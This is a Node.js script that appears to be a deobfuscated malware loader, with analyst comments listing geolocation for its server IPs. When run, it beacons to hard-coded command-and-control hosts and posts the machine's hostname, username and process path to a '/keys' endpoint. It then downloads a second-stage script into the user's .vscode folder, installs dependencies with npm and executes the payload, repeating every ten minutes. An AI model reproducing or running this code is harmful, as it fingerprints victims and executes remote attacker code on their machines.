const OS = require('os');
const request = require('request');
const path = require('path');
const exec = require('child_process')['exec'];
const node_process = require('node:process');
const homeDir = OS.homedir();
const fs = require('fs');
const { userInfo, platform } = require('node:os');

let timestamp;

/* http://147.124.197.149:1244 */
var endpoint = '';
/* amhqdw2 */
var type = '';

const createInitJsFile = () => {
  let dirPath = path.join(homeDir, '.vscode');

  try {
    fs.mkdirSync(dirPath, { recursive: true });
  } catch (aK) {
    dirPath = homeDir;
  }

  const aI = '' + endpoint + /j/ + type;
  const testFilePath = path.join(dirPath, 'test.js');

  try {
    fs.rmSync(testFilePath);
  } catch (aL) {}

  request.get(aI, (aM, aN, aO) => {
    if (!aM) {
      try {
        fs.writeFileSync(testFilePath, aO);
      } catch (aP) {}
      getPackageDependencies(dirPath);
    }
  });
};

const getPackageDependencies = dirPath => {
  const aG = '' + endpoint + '/p';
  const packageFilePath = path.join(dirPath, 'package.json');

  fs.existsSync(packageFilePath)
    ? installDependencies(dirPath)
    : request.get(aG, (aI, aJ, aK) => {
        if (!aI) {
          try {
            fs.writeFileSync(packageFilePath, aK);
          } catch (aL) {}
          installDependencies(dirPath);
        }
      });
};

const installDependencies = dirPath => {
  try {
    fs.existsSync(path.join(dirPath, 'node_modules'))
      ? runNode(dirPath)
      : exec('cd "' + dirPath + '" && npm i --silent', (aG, aH, aI) => {
          installNpm(dirPath);
        });
  } catch (aG) {}
};

const installNpm = dirPath => {
  try {
    fs.existsSync(path.join(dirPath, 'node_modules'))
      ? runNode(dirPath)
      : exec('npm --prefix "' + dirPath + '" install', (aG, aH, aI) => {
          runNode(dirPath);
        });
  } catch (aG) {}
};

const runNode = dirPath => {
  try {
    exec('node' + ' ' + path.join(dirPath, 'test.js'), (aG, aH, aI) => {});
  } catch (aG) {}
};

/*  
IP address:	95.179.135.133
hostname:	95.179.135.133.vultrusercontent.com
ISP:	AS-CHOOPA
ASN:	AS20473
City:	Amsterdam
Country:	Netherlands (NL) flag
Postal code:	2031
latitude:	52.3891
longitude:	4.6562
*/

/* 
IP address:	216.173.115.200
hostname:	216.173.115.200
ISP:	TIER-NET
ASN:	AS397423
City:	Ashburn
Region:	Virginia
Country:	United States (US) flag
Postal code:	20147
Metro code:	511
latitude:	39.018
longitude:	-77.539
*/

const getEndpoint = async target => {
  let url =
    target === 1
      ? 'http://95.179.135.133:1244/s/83f279fc5cf2'
      : 'http://216.173.115.200:1244/s/83f279fc5cf2';

  // return ZT3MTQ3LjEyNC4xOTcuMTQ5LGFtaHFkdzI=
  request.get(url, (aH, aI, aJ) => {
    if (aH) {
      target < 1 && getEndpoint(1);
    } else {
      (aK => {
        if (0 == aK.search('ZT3')) {
          let aL = '';
          try {
            for (let aM = 3; aM < aK.length; aM++) aL += aK[aM];
            // a2(aL) => 147.124.197.149,amhqdw2
            let arr = /* a2(aL).split(','); */ '147.124.197.149,amhqdw2';
            endpoint = 'http://' + arr[0] + ':1244';
            type = arr[1];
          } catch (aN) {
            return 0;
          }
          return 1;
        }
        return 0;
      })(aJ) > 0 && (send(), createInitJsFile());
    }
  });
};

const send = async () => {
  let hid = OS.hostname();

  if ('d' == platform()[0]) {
    hid = hid + '+' + userInfo().username;
  }

  let cc = '3E1';

  try {
    cc += node_process.argv[1];
  } catch (aE) {}

  post('oqr', cc, hid);
};

const post = async (ss, cc, hid) => {
  try {
    request.post({
      url: '' + endpoint + '/keys',
      formData: { ts: timestamp, type, hid, ss, cc },
    });
  } catch (aH) {}
};

const initialFunction = async () => {
  try {
    timestamp = Date.now().toString();
    await getEndpoint(0);
  } catch (aD) {}
};

initialFunction();

var checkpoint = 0;

let interval = setInterval(() => {
  if ((checkpoint += 1) < 3) {
    initialFunction();
  } else {
    clearInterval(interval);
  }
}, 600000); // 10 minutes
